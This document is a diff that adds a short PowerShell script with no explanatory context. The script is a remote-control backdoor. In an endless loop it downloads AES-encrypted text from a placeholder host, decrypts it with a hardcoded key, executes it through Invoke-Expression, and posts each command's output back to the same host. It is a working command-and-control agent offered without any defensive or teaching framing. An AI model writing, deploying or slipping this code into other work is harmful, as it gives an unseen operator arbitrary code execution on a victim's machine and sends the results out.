@@ -1,0 +1,15 @@
+$Key = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop")
+$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$AES.Key = $Key
+while ($true) {
+    $AES.IV = New-Object byte[] 16
+    $Decryptor = $AES.CreateDecryptor()
+    $Response = Invoke-WebRequest -Uri 'http://0.0.0.0:0000'
+    $CipherText = [Convert]::FromBase64String($Response.Content)
+    $PlainText = $Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length)
+    $Decrypted = [System.Text.Encoding]::UTF8.GetString($PlainText)
+    $Exe = iex $Decrypted
+    Invoke-WebRequest -Uri "http://0.0.0.0:0000" -Method POST -Body $Exe
+}
